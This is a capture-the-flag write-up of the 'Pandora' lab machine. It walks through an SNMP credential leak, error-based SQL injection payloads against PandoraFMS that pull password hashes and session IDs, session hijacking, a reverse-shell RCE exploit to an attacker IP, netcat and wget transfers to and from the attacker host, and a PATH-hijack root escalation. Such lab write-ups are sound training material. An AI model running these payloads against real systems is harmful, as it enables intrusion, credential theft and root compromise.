#box #snmp #SQLi #RCE #path-hijacking #restricted-shell #ghidra #GTFOBins #ssh-keygen #ssh-key-authentication 

Pandora is an "easy" machine that initially exposes a cleartext credential on SNMP. Throughout this credential we have an initial foothold on the target machine. Inside the target machine we realize that `/etc/apache2/sites-available/pandora.conf` tells us the presence of a virtual host running what seems to be a different website from what we've earlier noticed on our end. The ServerName is `pandora.panda.htb` so we opt to add that to our `/etc/hosts` file and try to reach it, unsuccessfully. We opt to perform a Local Port Forwarding with SSH and that enables us to access the hidden website. By looking at the version written on the bottom of the website `PandoraFMS v7.0NG.742_FIX_PERL2020` we discover that this version has suffered numerous vulnerabilities. For the current pentest we opted to perform the SQLi vulnerability mentioned [here](https://www.sonarsource.com/blog/pandora-fms-742-critical-code-vulnerabilities-explained/#unauthenticated-sql-injection-cve202132099) (which was the entry step necessary to proceed) and to use a RCE vulnerability shown [here](https://github.com/hadrian3689/pandorafms_7.44). 
Once on the target machine with newer user `matt` we notice the presence of a SUID set to a binary called `pandora_backup`. By downloading that binary on our end and using `strings` or `ghidra` to analyze it, we notice that it uses a `tar` command when launched, relatively referred in the SUID binary permitting us to perform a Path Hijacking attack. While performing the Path Hijacking attack we notice that the binary doesn't run because we're running on a restricted shell. We opt to escape the shell by either crafting a new pair of SSH keys and upload them on `matt` SSH folder or by escaping the shell with a GTFOBins, achieving root.
## Nmap

```bash
# Nmap 7.95 scan initiated Sun Sep 14 07:07:13 2025 as: /usr/lib/nmap/nmap -sCV --min-rate=10000 -o nmap_sCV 10.129.242.186
Nmap scan report for 10.129.242.186
Host is up (0.037s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 (RSA)
|   256 b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 (ECDSA)
|_  256 e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Play | Landing
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Sep 14 07:07:21 2025 -- 1 IP address (1 host up) scanned in 7.82 seconds
```
## 80 - HTTP

We discover the presence of a website. After some enumeration, nothing in particular comes out except for the name of the domain which appears to be `panda.htb`.
## 161 - SNMP

We enumerate SNMP, discovering in the process the presence of a clear-text password for the user `daniel`:

```bash
snmpwalk -v2c -c public 10.129.242.186 > snmpwalk.txt

	iso.3.6.1.2.1.25.4.2.1.5.1113 = STRING: "-u daniel -p HotelBabylon23"
```

Obtaining the credentials for the user `daniel:HotelBabylon23`.
## Foothold

We authenticate in the machine through SSH with the user `daniel` and inside of it we notice the presence of a VHost through apache's configuration:

```bash
cat /etc/apache2/sites-available/pandora.conf

<VirtualHost localhost:80>
  ServerAdmin admin@panda.htb
  ServerName pandora.panda.htb
  DocumentRoot /var/www/pandora
  AssignUserID matt matt
  <Directory /var/www/pandora>
    AllowOverride All
  </Directory>
  ErrorLog /var/log/apache2/error.log
  CustomLog /var/log/apache2/access.log combined
</VirtualHost>
```

We decide to perform a Port Forwarding to try access the virtual host, since the local port 80 shows a different website:

```bash
ssh -L 80:localhost:80 daniel@10.129.194.88
```

Finally accessing the new available website, showing a login page:
![[attachments/pandora-writeup-1.png]]
By looking at the bottom of the page, we discover the service running on this end is `PandoraFMS v7.0NG.742_FIX_PERL2020`. By looking online, we discover this version is vulnerable to a lot of issues, in particular a SQLi vulnerability and a RCE vulnerability. To obtain the RCE, however, we must be authenticated.
### CVE-2021-32099

We give a look to the SQLi vulnerability mentioned [here](https://www.sonarsource.com/blog/pandora-fms-742-critical-code-vulnerabilities-explained/#unauthenticated-sql-injection-cve202132099).

We understand that the injection is on the the file `chart_generator.php` file on the parameter `session_id`, which we can access freely from outside the application:

```bash
http://localhost/pandora_console/include/chart_generator.php
```

Receiving an `ACCESS IS NOT GRANTED` message.

We then try to append the `session_id` parameter and fuzz it with the [[FFuF#Parameter Fuzzing - GET|Parameter Fuzzing - GET]] method.

>It's necessary to explicit `-mc all` or `-mc 400` because by default it excludes those tries from the fuzzing's output

The fuzzing tells us various possibilities to obtain a SQLInjection,  but we'll keep the easier one:

```SQLi
1'1 
http://localhost/pandora_console/include/chart_generator.php?session_id=1%271
```

And the system will then return us the following error:

![[attachments/pandora-writeup-2.png]]

Now, it's a matter of manual enumeration. First of all we know that the database is a `mysql` database considering the name of the file shown `/var/www/pandora/pandora_console/include/db/mysql.php` by the log.

We discover that to leverage that SQLi we can base ourselves on Error-based injections, since we can output the result in clear sight on the error message. It clearly takes more time since we must carefully enumerate each resource.
We identify a MySQL error based function in SQL's `EXTRACTVALUE`. We personalize it a bit to make it clearer during the output (for further SQLi refer to [this](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#mysql-error-based) link)

```SQLi
1' AND EXTRACTVALUE(0,CONCAT('.','SQLi --> ',(SELECT version()),'<-- SQLi'))-- -
http://localhost/pandora_console/include/chart_generator.php?session_id=1%27%20AND%20EXTRACTVALUE(0,CONCAT(%27.%27,%27SQLi%20--%3E%20%27,(SELECT%20version()),%27%3C--%20SQLi%27))--%20-
```

>We can reduce the string before the injection in case we're not getting all the necessary text from the injection. Sometimes the available slot on the error message have a fixed amount of characters, thus we'll have to adjust the injection accordingly.

![[attachments/pandora-writeup-3.png]]

Now we can start the enumeration:

```SQLi
1' AND EXTRACTVALUE(0,CONCAT('.','SQLi --> ',(SELECT schema_name from information_schemata),'<-- SQLi'))-- -
```

This returns us an important message:
![[attachments/pandora-writeup-4.png]]

Basically telling us that we're already in a database called `pandora`. Now we can therefore enumerate the tables (refer to [this](https://dev.mysql.com/doc/refman/8.4/en/information-schema.html) link to know how the INFORMATION_SCHEMA is made in mysql) by querying [INFORMATION_SCHEMA.TABLES](https://dev.mysql.com/doc/refman/8.4/en/information-schema-tables-table.html).

```SQLi
1' AND EXTRACTVALUE(0,CONCAT('.','SQLi --> ',(SELECT table_name from INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA = 'pandora'),'<-- SQLi'))-- -
```

But the application returns us:
![[attachments/pandora-writeup-5.png]]
This means we'll have to put a limit to our query and return one result at a time:

```SQLi
1' AND EXTRACTVALUE(0,CONCAT('.','~',(SELECT table_name from INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA = 'pandora' LIMIT 1,1),'<-- SQLi'))-- -
```

Obtaining the first table name (we removed `SQLi` to improve the table readability):
![[attachments/pandora-writeup-6.png]]

We can now perform an enumeration to discover something more interesting. To do so we:
* Perform a for cycle with cURL and update the first value of the LIMIT variable. This will permit us to enumerate the content of the table by always returning one result at a time.
* `grep`, within a RegEx, the table name encapsulated between the `~`
* Strip the `~` from the string
* Return the list of tables into a txt file

```bash
for ((i=1;i<=100;i++)) do curl -s "http://localhost/pandora_console/include/chart_generator.php?session_id=1%27%20AND%20EXTRACTVALUE(0,CONCAT(%27.%27,%27~%27,(SELECT%20table_name%20from%20INFORMATION_SCHEMA.TABLES%20where%20TABLE_SCHEMA%20=%20%27pandora%27%20LIMIT%20$i,1),%27~%27))--%20-"; done | grep -o -E "~((\w*)?)~" | tr -d '~' > tables.txt
```

We'll now have obtained the list of available tables in our txt file. We can finally look for something important now.
By looking at the vulnerability [CVE-2020-5844](https://github.com/UNICORDev/exploit-CVE-2020-5844), we discover that we need to find a way to either get discover the username and password or the PHPSESSID of the user to properly authenticate.
From the tables extrapolate we realize that a few table might be interesting:

* `tsessions_php`
* `tcredential_store`
* `tusuario`
#### tcredential_store

Alternatively, we can try to use `tcredential_store` to find a combination of credentials that permit us to authenticate.

```SQLi
1' AND EXTRACTVALUE(0,CONCAT('.','~',(SELECT column_name from INFORMATION_SCHEMA.COLUMNS where TABLE_NAME = 'tcredential_store' LIMIT 3,1),'~'))-- -
1' AND EXTRACTVALUE(0,CONCAT('.','~',(SELECT column_name from INFORMATION_SCHEMA.COLUMNS where TABLE_NAME = 'tcredential_store' LIMIT 4,1),'~'))-- -
```

the 4th field is `username`, the 5th is `password`. We can now start enumerating the users and their credentials:

```SQLi
1' AND EXTRACTVALUE(0,CONCAT('.','~',(SELECT username from pandora.tcredential_store LIMIT 0,1),'~'))-- -
1' AND EXTRACTVALUE(0,CONCAT('.','~',(SELECT password from pandora.tcredential_store LIMIT 0,1),'~'))-- -
```

but unfortunately the table seems to be empty. To confirm that we could query the field `TABLE_ROWS` from the table `INFORMATION_SCHEMA.TABLES` to effectively see that it has now rows:

```SQLi
1' AND EXTRACTVALUE(0,CONCAT('.','~',(SELECT TABLE_ROWS from INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME = 'tcredential_store' LIMIT 0,1),'~'))-- -
```

#### tusuario

We iterate again to find out the column names of the table `tusuario`:

```SQLi
1' AND EXTRACTVALUE(0,CONCAT('.','~',(SELECT column_name from INFORMATION_SCHEMA.COLUMNS where TABLE_NAME = 'tusuario' LIMIT 0,1),'~'))-- -
```

And we discover that on the 6th field (`LIMIT 5,1`) a password field appears. Thus we again perform an injection on the password field:

```SQLi
1' AND EXTRACTVALUE(0,CONCAT('.','~',(SELECT password from pandora.tusuario LIMIT 0,1),'~'))-- -
```

The password seems to be quite long, like a hashed password. We start extrapolating the hash by leveraging the `SUBSTRING` method:

```SQLi
1' AND EXTRACTVALUE(0,CONCAT('.','~',(SELECT SUBSTR(password,1,30) from pandora.tusuario LIMIT 0,1),'~'))-- -
1' AND EXTRACTVALUE(0,CONCAT('.','~',(SELECT SUBSTR(password,31,60) from pandora.tusuario LIMIT 0,1),'~'))-- -
```

By trying with the first password, we realize that the passwords seems to be `MD5` since the length is 32 characters, we exfiltrate the following:

```bash
76323c174bd49ffbbdedf678f6cc89a6
f655f807365b6dc602b31ab3d6d43acc
```

In both the cases, the passwords doesn't seem crackable.
#### tsessions_php

We then build the new SQL Injection to target those tables. Before doing so, though, we need to know the column names of those tables. Let's start with `tsessions_php`:

```SQLi
1' AND EXTRACTVALUE(0,CONCAT('.','~',(SELECT column_name from INFORMATION_SCHEMA.COLUMNS where TABLE_NAME = 'tsessions_php' LIMIT 1,1),'~'))-- -
```

Again, by enumerating that, we discover that the tables has 3 (0,1,2) columns, because `LIMIT 3,1` returns us an empty set. Let's look further into this table and print out the `id_session` field:

```SQLi
1' AND EXTRACTVALUE(0,CONCAT('.','~',(SELECT id_session from pandora.tsessions_php LIMIT 0,1),'~'))-- -
```

We weren't able for some reason to extrapolate the `data` field directly on the error, thus we extrapolate the session IDs and then try to inject it to our `session_id` parameter from `chart_generator.php`

>When enumerating the table `tsessions_php`, every single request logs a session with its id in this table. To properly exfiltrate the required `session_id` we opted to order the query by `last_active` ASC to find on top the oldest record and skip those which are newly generated by us

```bash
for ((i=0;i<50;i++)) do curl -s "http://localhost/pandora_console/include/chart_generator.php?session_id=1%27%20AND%20EXTRACTVALUE(0,CONCAT(%27.%27,%27~%27,(SELECT%20id_session%20from%20pandora.tsessions_php%20ORDER%20BY%20last_active%20ASC%20LIMIT%20$i,1),%27~%27))--%20-"; done | grep -o -E "~((\w*)?)~" | tr -d '~' > id_session.txt
```

We then fuzz the request by adding the Cookie to the request and excluding "common sized" responses. The response which will return a different size, it's very likely to be the working cookie. We can do so with the [[FFuF#Cookie Fuzzing|Cookie Fuzzing]] method

```bash
ffuf -w id_session.txt -u http://localhost/pandora_console/index.php -c -v -ic -H "Cookie: PHPSESSID=FUZZ"  -fs 13674


        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://localhost/pandora_console/index.php
 :: Wordlist         : FUZZ: /root/Desktop/HTB/Pandora/id_session.txt
 :: Header           : Cookie: PHPSESSID=FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 13674
________________________________________________

[Status: 200, Size: 74777, Words: 15276, Lines: 1387, Duration: 438ms]
| URL | http://localhost/pandora_console/index.php
    * FUZZ: g4e01qdgk36mfdh90hvcc54umq
```

The cookie to authenticate is: `g4e01qdgk36mfdh90hvcc54umq`.

### Authentication to RCE

To authenticate onto Pandora FMS we replace our current session cookie with the newly found one. To do so we can go on the browser on the Developer Tools -> Storage:

![[attachments/pandora-writeup-7.png]]

From here, we can simply update the value of the cookie `PHPSESSID` with the found one and refresh the page.
Here we go, authenticated!

![[attachments/pandora-writeup-8.png]]

## CVE-2020-13851

We can finally use [CVE-2020-13851](https://github.com/hadrian3689/pandorafms_7.44) to gain RCE on the target machine:

```bash
python3 CVE-2020-13851.py -t http://localhost/ -c g4e01qdgk36mfdh90hvcc54umq -lhost 10.10.16.45 -lport 4444
```

Obtaining a shell session as the user `matt` and obtaining the local flag.

## Privilege Escalation

On the target machine we discover a binary with a SUID bit:  `/usr/bin/pandora_backup`. We try to run it but nothing in particular comes out of it. We then decide to download it on our end with netcat:

```bash
# ATTACKER
nc -lvnp 9002 > pandora_backup

# VICTIM
nc 10.10.16.45 9002 < pandora_backup
```

We now opt to use `strings` to understand the structure of this binary:

```bash
strings pandora_backup
```

We opt to use `ghidra` since it might get easier to read through it. So we open ghidra, analyze the target file and the hop onto the `main` function from the `Symbol Tree` menu on the left, discovering that this binary recalls a function that invokes the `tar` binary:

![[attachments/pandora-writeup-9.png]]

Since the command being execute is a plain `tar` and it's not set in absolute path, we could add a path to our PATH environment variable and then create a fake `tar` executable to run instead of the classical one. The custom `tar` binary will execute a shell that will then be ran as the user owning the `pandora_backup` binary.

So, the steps are the following:
* Set up a new path to `/tmp`
* Create a custom `tar` binary containing a malicious script that elevates us to root
* Set `chmod +x` to our custom `tar` binary
* Run the `/usr/bin/pandora_backup` that will execute `tar` in our custom location that will then execute a malicious `tar` script instead of the real one

```bash title:"Set up a custom path to the PATH variable"
export PATH=/tmp:$PATH
```

```bash title:"Create a malicious tar binary and making it runnable"
echo "/bin/bash" > tar 
chmod +x tar # Without doing so the executable won't be runnable. Using which tar will permit us to understand what is being run effectively. If which tar does not refresh to our new tar maybe it's missing chmod
```

>* Executing bash will elevate us to a shell based on who's actually launching tar. The owner is actually inherited when the binary is recalled from another binary based on the parent's binary ownership
>* Without doing so the executable won't be runnable. Using which tar will permit us to understand what is being run effectively. If which tar does not refresh to our new tar maybe it's missing chmod 

```bash title:"Executing the pandora_backup binary leveraging on our malicious tar binary"
which tar # it will now answer /tmp/tar instead of /usr/bin/tar
/usr/bin/pandora_backup # this will now run and execute the newer tar binary instead of the original one
```

This shall have execute the `bash` command as intended and give us a shell as root. However, it didn't work. Let's investigate why.

### Escaping the Restricted shell

Let's analyze the `pandora_backup` binary:

```bash
-rwsr-x---  1 root   matt       16816 Dec  3  2021 pandora_backup
```

We know that:
* It has a SUID set
* The owner is `root`
* As `matt` with the SUID bit we can run that file as `root`

So, why when we execute the binary, considering we can execute it as root, we get an error on accessing the backup file inside the `root` folder ?

```bash
matt@pandora:/tmp$ /usr/bin/pandora_backup

PandoraFMS Backup Utility
Now attempting to backup PandoraFMS client
tar: /root/.backup/pandora-backup.tar.gz: Cannot open: Permission denied # This error tells us more than we might think
tar: Error is not recoverable: exiting now
Backup failed!
Check your permissions!
```

Technically speaking, a binary running as root shall be able to access the root folder. However, in this case we're running that binary as `matt` with a SUID bit set that allows us to run it as `root`. 
**This identifies that our shell is currently restricted.** 

To evade the restricted shell we have two ways:
* Leveraging any binary that permit us to escape the restricted shell. We can do so by filtering the search bar of GTFOBins with the filter `+shell`. 
* Create a new SSH key with `ssh-keygen` and authenticate as `matt` with the new SSH key. This will generate a new shell for that user that will be unrestricted. On that shell we'll be able to effectively run the binary unrestricted

#### GTFOBins

Let's user the `at` binary which felt more consistent. We can use the first method shown here [GTFOBins](https://gtfobins.github.io/gtfobins/at/#shell) to escape the restricted shell:

![[attachments/pandora-writeup-10.png]]

```bash
echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | at now; tail -f /dev/null
```

At this point, we can opt to run again `/usr/bin/pandora_backup` that will now run our malicious tar binary containing `/bin/bash` and since we're outside the restricted shell it'll give us a root shell:

```bash
$ id
uid=1000(matt) gid=1000(matt) groups=1000(matt)

$ /usr/bin/pandora_backup

/usr/bin/pandora_backup
PandoraFMS Backup Utility
Now attempting to backup PandoraFMS client
warning: commands will be executed using /bin/sh
job 20 at Tue Sep 16 22:16:00 2025
/bin/sh: 0: can't access tty; job control turned off

# id

uid=0(root) gid=1000(matt) groups=1000(matt),0(root)
```

To make this work properly, we must ensure that the following conditions are met:

* Our initial shell is an interactive shell (such as a Python Fully Interactive TTY)
* The hijacked path has been added to the $PATH variable
* The malicious `tar` binary has been created and has been `chmod`

#### SSH Shell

To escape the unrestricted shell, when possible, we can opt to generate a pair of SSH keys and authenticate through them:

```bash title:"Generate keys for the user matt"
ssh-keygen     
Generating public/private ed25519 key pair.
Enter file in which to save the key (/root/.ssh/id_ed25519): ./matt
Enter passphrase for "./matt" (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in ./matt
Your public key has been saved in ./matt.pub
The key fingerprint is:
SHA256:ZP6Ty25fiVsZvuFxqinylZI6DB0cKP+pmlFeBJKfXK4 root@kali
The key's randomart image is:
+--[ED25519 256]--+
|    ....         |
|    o...o        |
|     = =+.       |
|      ==+        |
|      .+So    .  |
|     oE.+. o + + |
|    . .+  * + O .|
|     o. +oo= * * |
|    o.  .*=o=.+  |
+----[SHA256]-----+
```

We then transfer the public key onto the machine inside `/home/matt/.ssh/authorized_keys`:

```bash
wget http://10.10.16.45:8000/matt.pub -O /home/matt/.ssh/authorized_keys
```

And we then authenticate with `matt` via SSH with the private key:

```bash
ssh -i matt matt@10.129.124.12
```

We add the `/tmp` path to our $PATH variable (since the shell is different the environment variables are no longer valid from our previous shell):

```bash
export PATH=/tmp:$PATH
```

We can now finally run the `/usr/bin/pandora_backup` file that will run over the malicious `tar` file and grant us a root shell:

```bash
matt@pandora:/tmp$ /usr/bin/pandora_backup 
PandoraFMS Backup Utility
Now attempting to backup PandoraFMS client
warning: commands will be executed using /bin/sh
job 21 at Tue Sep 16 22:28:00 2025
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=1000(matt) groups=1000(matt),0(root)
```
